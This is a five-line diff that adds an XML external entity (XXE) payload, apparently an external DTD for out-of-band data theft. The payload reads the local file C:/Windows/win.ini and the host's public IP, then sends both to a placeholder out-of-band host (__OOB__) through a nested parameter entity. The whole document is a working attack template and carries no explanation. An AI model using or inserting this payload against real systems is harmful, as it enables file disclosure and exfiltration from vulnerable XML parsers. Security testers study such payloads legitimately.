@@ -1,0 +1,5 @@
+<!ENTITY % IP SYSTEM "https://ipinfo.io/ip">
+<!ENTITY % l1 SYSTEM "file:///C:/Windows/win.ini">
+<!ENTITY % e1 "<!ENTITY &#x25; exfil SYSTEM 'http://__OOB__/?ip=%IP;&file=%l1;'>">
+%e1;
+%exfil;
